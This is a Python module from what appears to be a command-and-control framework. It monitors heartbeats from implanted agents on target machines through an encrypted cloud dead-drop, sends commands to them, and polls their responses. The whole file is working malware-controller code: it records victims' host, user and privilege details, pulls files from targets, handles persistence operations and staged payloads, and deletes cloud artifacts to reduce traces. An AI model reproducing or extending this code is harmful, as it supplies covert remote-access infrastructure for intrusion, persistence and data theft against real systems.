# providers/_monitor.py
# Heartbeat monitor, async response poller, send_async.

import json
import os
import re
import socket
import threading
import time
from pathlib import Path
from typing import Optional

from providers._notifications import (
    _n_ok, _n_err, _n_warn, _n_info,
    _n_output, _n_ul_confirmed, _n_heartbeat, _n_agent_dead,
    _n_save_session, _save_ul_record,
)
from providers._session import (
    Session, SessionManager, MZ_MARKER, HB_REFRESH_INTERVAL,
    DOWNLOADS_DIR, RateLimitedError,
    _sync_persist_check, _sync_persist_probe, _sync_persist_op,
)
from providers._crypto import encrypt_command, decrypt_output, build_task


def _parse_heartbeat(text: str) -> dict:
    p    = text.split("|")
    keys = ["timestamp", "host", "user", "ip", "os", "privs",
            "agent_start_cwd", "op_cwd", "ip_ext", "pid", "process", "domain", "blob_path",
            "blob_tried", "seq"]
    return {keys[i]: p[i] if i < len(p) else "" for i in range(len(keys))}


_INVALID_EXT_IPS = {
    "1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4",
    "208.67.222.222", "208.67.220.220",
    "9.9.9.9", "149.112.112.112",
    "n/a", "unknown", "",
}


def is_valid_ext_ip(ip: str) -> bool:
    if not ip or ip in _INVALID_EXT_IPS:
        return False
    parts = ip.split(".")
    if len(parts) != 4:
        return True
    try:
        o = [int(x) for x in parts]
    except ValueError:
        return False
    if o[0] == 10:                           return False
    if o[0] == 172 and 16 <= o[1] <= 31:    return False
    if o[0] == 192 and o[1] == 168:         return False
    if o[0] == 127:                          return False
    if o[0] == 169 and o[1] == 254:         return False
    return True


# ══════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT MONITOR  (one daemon thread per session)
# ══════════════════════════════════════════════════════════════════════════════

class HeartbeatMonitor(threading.Thread):
    def __init__(self, session: Session):
        super().__init__(daemon=True, name=f"hb-{session.id}")
        self.session          = session
        self._stop            = threading.Event()
        self._announced_agent = False

    def stop(self): self._stop.set()

    def run(self):
        while not self._stop.wait(HB_REFRESH_INTERVAL):
            if self.session.polling_stopped:
                continue
            try:
                self._tick()
            except Exception:
                pass

    def _tick(self):
        sess = self.session
        sess.last_tick = time.time()
        try:
            raw = sess.transport.download(sess.profile.heartbeat_path)
        except RateLimitedError:
            return   # 429 — provider is reachable, agent is not dead; skip cycle
        except (ConnectionError, TimeoutError, OSError):
            # LOW-7: cloud storage unreachable — do not blame the agent
            sess.state.update(state="cloud_unreachable", key_mismatch=False)
            return
        if not raw:
            sess.state.update(state="offline", key_mismatch=False)
            return

        text = raw.decode("utf-8", errors="replace").strip()
        if text.startswith("KM:"):
            sess.state.update(state="offline", key_mismatch=True)
            return

        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
        if dec is None:
            sess.state.update(state="offline", key_mismatch=True)
            return

        hb  = _parse_heartbeat(dec)
        now = time.time()
        ts  = hb.get("timestamp", "")
        is_new_heartbeat = ts and ts != sess.state.last_hb_ts

        # Monotonic counter check (F3-2 / M2) — warn on seq regression.
        # Blocking would cause DoS on agent restart (seq resets to 0); warn-only
        # gives operators visibility without a liveness hazard.
        hb_seq_str = hb.get("seq", "")
        if hb_seq_str:
            try:
                hb_seq = int(hb_seq_str)
                if sess.state.last_hb_seq >= 0 and hb_seq < sess.state.last_hb_seq:
                    _n_warn(f"[{sess.id}] heartbeat seq regression: got {hb_seq}, last {sess.state.last_hb_seq} — possible replay or agent restart")
                sess.state.update(last_hb_seq=hb_seq)
            except (ValueError, TypeError):
                pass

        if is_new_heartbeat:
            try:
                hb_age = now - float(ts)
            except (ValueError, TypeError):
                hb_age = 0.0
            if hb_age <= sess.agent_sleep * sess.hb_dead_multiplier:
                sess.state.update(last_hb_ts=ts, last_seen_at=now)
            else:
                sess.state.update(last_hb_ts=ts)
        diff = (now - sess.state.last_seen_at) if sess.state.last_seen_at else float("inf")
        new_state = (
            "online"  if diff < sess.agent_sleep * sess.hb_warn_multiplier else
            "idle"    if diff < sess.agent_sleep * sess.hb_dead_multiplier else
            "offline"
        )

        upd: dict = {"state": new_state, "key_mismatch": False}
        if hb.get("host"):  upd["target_host"]  = hb["host"]
        if hb.get("user"):  upd["target_user"]  = hb["user"]
        if hb.get("os"):    upd["target_os"]    = hb["os"]
        if hb.get("ip"):    upd["target_ip"]    = hb["ip"]
        if hb.get("ip_ext") and is_valid_ext_ip(hb["ip_ext"]):
            upd["target_ip_ext"] = hb["ip_ext"]
        if hb.get("privs"):   upd["target_privs"]  = hb["privs"]
        upd["target_domain"] = hb.get("domain", "")
        if hb.get("blob_path") and not sess.state.target_blob:
            upd["target_blob"] = hb["blob_path"]
            sess.hist.record_artifact("enc_staged_agent", hb["blob_path"])
        new_start_cwd = hb.get("agent_start_cwd", "")
        if new_start_cwd:
            upd["agent_start_cwd"] = new_start_cwd
            if new_start_cwd != sess.state.agent_start_cwd:
                # Agent rebooted — reset remote_cwd to the new boot directory
                # so that the next command is not sent with a stale CWD from
                # the previous session.
                upd["remote_cwd"] = new_start_cwd
        if hb.get("op_cwd"):  upd["remote_cwd"] = hb["op_cwd"]
        if hb.get("pid"):     upd["agent_pid"]   = hb["pid"]
        if hb.get("process"): upd["agent_process"] = hb["process"]

        prev_state = sess.state.state
        sess.state.update(**upd)

        # blob_path in HB proves stage2 decrypted and blob persisted on target —
        # only then is stage2 safe to cancel from cloud (sandbox rarely writes blobs to disk).
        if (is_new_heartbeat and not sess.profile.s2_deleted
                and sess.profile.deploy_mode in ("staged-enc",)
                and hb.get("blob_path")):
            sess.profile.s2_deleted = True
            try:
                sess.transport.delete(sess.profile.s2_path_cloud)
            except Exception:
                pass  # best-effort — 404 or net error are both acceptable

        _n_save_session(sess)

        if is_new_heartbeat:
            _n_heartbeat(sess.id, {"alive": new_state in ("online", "idle")})
        if prev_state != "offline" and new_state == "offline" and prev_state != "unknown":
            _n_agent_dead(sess.id)

        if not self._announced_agent and new_state in ("online", "idle") and hb.get("host"):
            self._announced_agent = True
            if sess._suppress_first_announce:
                # Server restarted — this is a pre-existing session, not a new connection.
                # Only announce when a genuinely new heartbeat arrives (last_hb_ts changes).
                sess._suppress_first_announce = False
            else:
                _n_ok(f"[{sess.id}] Agent connected: {hb.get('host')} ({hb.get('user')})")
            if sess.profile.deploy_mode == "staged-enc" and not hb.get("blob_path"):
                _blob_tried = hb.get("blob_tried") or (
                    sess.profile.blob_path_win if "windows" in hb.get("os", "").lower()
                    else sess.profile.blob_path
                )
                _n_warn(f"[{sess.id}] Blob not saved on target — agent won't survive reboot/restart  (tried: {_blob_tried})  (use /blobsave to fix)")


def _initial_hb_check(sess: Session):
    try:
        raw = sess.transport.download(sess.profile.heartbeat_path)
        if not raw:
            return
        text = raw.decode("utf-8", errors="replace").strip()
        if text.startswith("KM:"):
            sess.state.update(key_mismatch=True)
            return
        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
        if dec is None:
            sess.state.update(key_mismatch=True)
            return
        hb  = _parse_heartbeat(dec)
        ts  = hb.get("timestamp", "")
        if not ts:
            return
        # Seed last_hb_seq from the existing heartbeat so the monitor doesn't
        # warn on the first legitimate tick after server restart.
        hb_seq_str = hb.get("seq", "")
        if hb_seq_str:
            try:
                sess.state.update(last_hb_seq=int(hb_seq_str))
            except (ValueError, TypeError):
                pass
        now = time.time()
        try:
            diff = now - float(ts)
        except ValueError:
            diff = 0
        new_state = (
            "online"  if diff < sess.agent_sleep * sess.hb_warn_multiplier else
            "idle"    if diff < sess.agent_sleep * sess.hb_dead_multiplier else
            None
        )
        if new_state is None:
            # Heartbeat exists but timestamp is too old (agent dead / killed before restart).
            # Record last_hb_ts so the periodic monitor doesn't treat this stale file as a
            # fresh heartbeat on its first tick (which would set last_seen_at=now → "online").
            if ts:
                sess.state.update(last_hb_ts=ts)
            return
        # Use the real heartbeat timestamp as last_seen_at, not the server restart time.
        # This ensures the UI shows the correct "X ago" and the session decays to
        # offline naturally if the agent is no longer running.
        hb_time = float(ts)
        upd: dict = {"state": new_state, "last_hb_ts": ts, "last_seen_at": hb_time}
        if hb.get("host"):           upd["target_host"]     = hb["host"]
        if hb.get("user"):           upd["target_user"]     = hb["user"]
        if hb.get("os"):             upd["target_os"]       = hb["os"]
        if hb.get("ip"):
            upd["target_ip"]         = hb["ip"]
            upd["ip_int_initial"]    = hb["ip"]
        if hb.get("ip_ext") and is_valid_ext_ip(hb["ip_ext"]):
            upd["target_ip_ext"]     = hb["ip_ext"]
            upd["ip_ext_initial"]    = hb["ip_ext"]
        if hb.get("privs"):   upd["target_privs"]  = hb["privs"]
        upd["target_domain"] = hb.get("domain", "")
        if hb.get("blob_path") and not sess.state.target_blob:
            upd["target_blob"] = hb["blob_path"]
            sess.hist.record_artifact("enc_staged_agent", hb["blob_path"])
        new_start_cwd = hb.get("agent_start_cwd", "")
        if new_start_cwd:
            upd["agent_start_cwd"] = new_start_cwd
            if new_start_cwd != sess.state.agent_start_cwd:
                upd["remote_cwd"] = new_start_cwd
        if hb.get("op_cwd"): upd["remote_cwd"] = hb["op_cwd"]
        sess.state.update(**upd)
        # Suppress the "Agent connected" notification on server restart —
        # the agent was already known before, we are just restoring state.
        # The monitor will fire a real notification only when a NEW heartbeat arrives.
        if hb.get("host"):
            sess._suppress_first_announce = True
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ASYNC RESPONSE POLLER  (one transient thread per sent command)
# ══════════════════════════════════════════════════════════════════════════════

class AsyncPoller(threading.Thread):
    def __init__(self, session: Session, baseline: str, display_cmd: str, cmd_id: str,
                 session_token: str = ""):
        super().__init__(daemon=True, name=f"poll-{session.id}-{cmd_id[:4]}")
        self.session       = session
        self.baseline      = baseline
        self.display_cmd   = display_cmd
        self.cmd_id        = cmd_id
        self.session_token = session_token
        self._stop         = threading.Event()
        self.done          = threading.Event()
        self.result: Optional[str] = None

    def stop(self): self._stop.set()

    def run(self):
        sess  = self.session
        start = time.time()
        try:
            while not self._stop.is_set():
                if time.time() - start >= sess.poll_timeout:
                    _n_err(f"[{self.cmd_id}] timeout waiting for: {self.display_cmd}")
                    # Hold poller_lock so send_async can't upload a new command between
                    # the _stop check and the delete completing (eliminates TOCTOU window).
                    # update_response and _n_output are also inside the guard so a cancelled
                    # poller doesn't send a phantom timeout error for an already-replaced cmd.
                    with sess.poller_lock:
                        if not self._stop.is_set():
                            try:
                                # Reset input to MZ sentinel instead of deleting.
                                # Deleting the file causes the agent (which checks None vs MZ)
                                # to skip the command entirely: it sees None and sleeps, never
                                # reading the timed-out command that may still be on the channel.
                                # Writing MZ lets the agent skip cleanly on its next poll cycle.
                                sess.transport.upload(sess.profile.input_path, b"MZ")
                            except Exception as e:
                                _n_warn(f"[{self.cmd_id}] could not reset input: {e}")
                            sess.hist.update_response("ERROR: timeout — no response from agent")
                            _n_output(self.cmd_id, "ERROR: timeout — no response from agent")
                    return

                raw = sess.transport.download(sess.profile.output_path)
                if raw:
                    text = raw.decode("utf-8", errors="replace").strip()
                    if text and text != self.baseline and text != MZ_MARKER:
                        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
                        if dec is None:
                            _n_err(f"[{self.cmd_id}] decrypt failed (key mismatch?)")
                            return
                        # --- JSON envelope protocol ---
                        try:
                            resp = json.loads(dec)
                        except (json.JSONDecodeError, TypeError):
                            # Pre-migration agent or corruption: treat as stale
                            sess.baseline = text
                            self._stop.wait(sess.poll_interval)
                            continue

                        if resp.get("id") != self.cmd_id:
                            # Stale response from a different command
                            sess.baseline = text
                            self._stop.wait(sess.poll_interval)
                            continue

                        # Verify mutual-auth token — reject responses from agents that
                        # could not decrypt the task (they never saw the token).
                        if self.session_token and resp.get("session_token") != self.session_token:
                            _n_err(f"[{self.cmd_id}] session_token mismatch — response rejected (forged or stale)")
                            sess.baseline = text
                            self._stop.wait(sess.poll_interval)
                            continue

                        # Valid matching response
                        output       = resp.get("output", "").strip()
                        cwd          = resp.get("cwd", "")
                        status       = resp.get("status", "ok")
                        staging_path = resp.get("staging_path", "")
                        artifacts    = resp.get("artifacts", [])

                        if cwd:
                            sess.state.update(remote_cwd=cwd)
                        sess.baseline = text

                        # HIGH-9: delete output file from cloud after reading — prevent
                        # operational history accumulation on the dead-drop storage.
                        try:
                            sess.transport.delete(sess.profile.output_path)
                        except Exception as e:
                            _n_warn(f"[{self.cmd_id}] could not delete output blob: {e}")

                        for art in artifacts:
                            op   = art.get("op", "")
                            kind = art.get("type", "")
                            path = art.get("path", "")
                            if op == "add" and kind and path:
                                sess.hist.record_artifact(kind, path)
                                _n_info(f"[artifact] +{kind}: {path}")
                            elif op == "remove" and kind and path:
                                sess.hist.remove_artifact(kind, path)
                                _n_info(f"[artifact] -{kind}: {path}")
                        if artifacts:
                            _n_ul_confirmed(sess.id)

                        self.result = output

                        # Auto-save for /download — uses staging_path field, not raw output
                        if self.cmd_id in sess.pending_dl:
                            filename, local_dest = sess.pending_dl.pop(self.cmd_id)
                            if status == "error" or not staging_path:
                                err_msg = output or "ERROR: download failed"
                                _n_err(f"[{self.cmd_id}] {err_msg}")
                                sess.hist.update_response(err_msg)
                                _n_output(self.cmd_id, err_msg)
                            else:
                                file_data = sess.transport.download(staging_path)
                                if file_data:
                                    if local_dest:
                                        dest = Path(local_dest)
                                        if local_dest.endswith("/") or Path(local_dest).is_dir():
                                            dest = dest / filename
                                    else:
                                        sess_dl = DOWNLOADS_DIR / sess.id
                                        sess_dl.mkdir(parents=True, exist_ok=True)
                                        dest = sess_dl / filename
                                    dest.parent.mkdir(parents=True, exist_ok=True)
                                    dest.write_bytes(file_data)
                                    sess.transport.delete(staging_path)
                                    msg = f"saved: {dest}  ({len(file_data):,} bytes)"
                                    _n_ok(f"[{self.cmd_id}] {msg}")
                                    sess.hist.update_response(msg)
                                    _n_output(self.cmd_id, f"File {filename} ({len(file_data):,} bytes) downloaded — check Artifacts")
                                else:
                                    msg = "ERROR: staging download failed"
                                    _n_err(f"[{self.cmd_id}] staging download failed")
                                    sess.hist.update_response(msg)
                                    _n_output(self.cmd_id, msg)
                            return

                        if self.cmd_id in sess.pending_ul:
                            ul_info = sess.pending_ul.pop(self.cmd_id)
                            if status == "ok":
                                _save_ul_record(sess.id, ul_info, sess.hist._log_dir)
                                _n_ul_confirmed(sess.id)

                        sess.hist.update_response(self.result)
                        _n_output(self.cmd_id, self.result)
                        if "/persist check" in self.display_cmd:
                            _sync_persist_check(sess, self.result)
                        if "/persist probe" in self.display_cmd and "PROBE:" in self.result:
                            _sync_persist_probe(sess, self.result)
                        _pm = re.search(r'/persist (install|remove|status) (\S+)', self.display_cmd)
                        if _pm:
                            _sync_persist_op(sess, _pm.group(1), _pm.group(2), self.result)
                        return

                self._stop.wait(sess.poll_interval)
        finally:
            self.done.set()


def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
               operator: str = "", fire_and_forget: bool = False,
               on_upload_failure: "Optional[Callable[[str], None]]" = None) -> str:
    if not cmd_id:
        cmd_id = os.urandom(8).hex()

    # Inject mutual-auth token into the task JSON before encryption.
    # The token is a random 16-byte nonce embedded in the plaintext envelope;
    # the agent echoes it in the response so the poller can reject forged replies.
    session_token = os.urandom(16).hex()
    try:
        _env = json.loads(task_json)
        _env["session_token"] = session_token
        task_json = json.dumps(_env, ensure_ascii=False, separators=(',', ':'))
    except Exception:
        session_token = ""  # degraded: token injection failed, proceed without it

    with session.poller_lock:
        if session.poller and not session.poller.done.is_set():
            session.poller.stop()
            _n_info("Previous pending command cancelled")

    try:
        payload = encrypt_command(task_json, session.private_key_file, session.session_key_hex,
                                  session.key_password)
    except Exception as e:
        _n_err(f"[{cmd_id}] encryption failed: {e}")
        return cmd_id

    def _upload_and_start():
        # Snapshot baseline before upload so the poller knows what "no response yet" looks like.
        # Done inside the thread (network call) but captured into a local so the AsyncPoller
        # uses the value current at upload time, not whatever session.baseline is later.
        cur = session.transport.download(session.profile.output_path)
        captured_baseline = cur.decode("utf-8", errors="replace").strip() if cur else session.baseline
        session.baseline = captured_baseline

        _n_info(f"[{cmd_id}] uploading to input_path={session.profile.input_path!r} payload_len={len(payload)}")
        upload_ok = session.transport.upload(session.profile.input_path, payload.encode())
        _n_info(f"[{cmd_id}] upload result={upload_ok}")
        # Verify: re-download input immediately after upload to confirm Dropbox has the new content
        import time as _time; _time.sleep(1)
        verify = session.transport.download(session.profile.input_path)
        _n_info(f"[{cmd_id}] verify input after upload: len={len(verify) if verify else 'None'} content[:6]={verify[:6] if verify else 'None'!r}")
        if not upload_ok:
            _n_err(f"[{cmd_id}] upload failed")
            if on_upload_failure is not None:
                on_upload_failure(cmd_id)
            return

        session.hist.add(display, cmd_id, operator=operator)
        _n_ok(f"[{cmd_id}] sent")

        if fire_and_forget:
            # No response expected — resolve pending immediately after upload.
            session.hist.update_response("(no response expected)")
            _n_output(cmd_id, "(no response expected)")
            with session.poller_lock:
                if session.poller:
                    session.poller.done.set()
            return

        with session.poller_lock:
            p = AsyncPoller(session, captured_baseline, display, cmd_id, session_token)
            session.poller = p
        p.start()

    threading.Thread(target=_upload_and_start, daemon=True).start()
    return cmd_id
